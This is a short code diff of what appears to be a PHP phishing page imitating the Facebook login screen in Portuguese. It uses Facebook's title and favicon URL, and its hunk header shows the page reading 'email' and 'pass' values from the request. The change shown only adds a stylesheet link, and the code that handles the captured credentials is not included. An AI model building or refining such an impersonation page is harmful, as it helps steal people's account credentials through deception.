@@ -19,6 +19,7 @@ if(isset($_GET["email"]) && isset($_GET['pass'])){
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, user-scalable=no">
     <title>Facebook - entre ou cadastre-se</title>
+    <link rel="stylesheet" href="reset.css">
     <link rel="stylesheet" href="face.css">
     <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/EWLVhDVJTum.png?_nc_eui2=AeFocUGfEZVWL8In8Gzq3Gimk_R_3tDHQzCT9H_e0MdDMCwWwamK3W3LsxGJLv1h8gUzsrLvkXKzCLLj5nsjQten" type="image/x-icon">
 </head>
